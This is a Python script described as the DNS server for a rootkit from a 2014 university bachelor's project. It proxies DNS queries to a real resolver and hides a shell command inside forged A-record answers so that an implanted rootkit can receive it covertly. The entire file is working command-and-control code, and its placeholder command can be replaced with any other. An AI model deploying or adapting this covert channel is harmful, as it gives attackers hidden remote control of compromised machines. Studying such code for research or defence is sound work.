#!/usr/bin/python
from dnslib import *

'''
 * Source code for the OSOM rootkit DNS server, as part of the bachelor's
 * project of Morten Espensen and Niklas Hoej:
 * Rootkits: Out of Sight, Out of Mind.
 * University of Copenhagen, Department of Computer Science, 2014.
 *
 * This is a non-stable version exclusively intended for educational purposes.
'''


BUFF_SIZE = 1024
DOMAIN = 'dnstunnel.example.me'
REAL_DNS_SERVER = '8.8.8.8'
UDP_PORT = 53
PAYLOAD = "echo 'foo' > /tmp/test1"

def encode_payload(dnsreq, payloadstr):
    if len(payloadstr) % 4:
        payloadstr += '\x20' * (4 - (len(payloadstr) % 4))
    if not dnsreq.rr:
        return
    a = dnsreq.a
    for i in range(0, len(payloadstr), 4):
        ip  = '.'.join([str(ord(x)) for x in payloadstr[i:i+4]])
        dnsreq.add_answer(RR(str(a.rname), a.rtype, a.rclass, a.ttl, A(ip)))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("", UDP_PORT))

while 1:
    data, addr = sock.recvfrom(BUFF_SIZE)
    print addr
    print data
    try:
    	# Validate data
    	dnsreq = DNSRecord.parse(data)
    	print dnsreq

    	print 'Creating modified request:'
    	org_domain = str(dnsreq.get_q().get_qname())
    	real_domain = org_domain.replace('.' + DOMAIN, '')
    	print 'Updated packet, sending..'
    	dnsq = DNSRecord(q=dnsreq.q)
    	dnsq.q.qname = real_domain
    	print dnsq
    	dnsres = dnsq.send(REAL_DNS_SERVER)
    	print 'Got response'
    	print dnsres
    	print str(dnsres.pack()).encode('hex')
    	dnsres.header.id = dnsreq.header.id
    	dnsres.header.ra = dnsreq.header.ra
    	dnsres.header.rd = dnsreq.header.rd
    	print 'Encoding payload'
    	encode_payload(dnsres, 'OSOM')
    	encode_payload(dnsres, PAYLOAD)
    	print 'Updating rnames..'
    	for i in dnsres.rr:
    	    i.rname = str(i.rname) + '.' + DOMAIN

    	dnsres.q.qname = org_domain
    	print dnsres
    	print 'Done'
    	sock.sendto(dnsres.pack(),addr)

    except:
        print "Not a dns packet:\n%s" % data

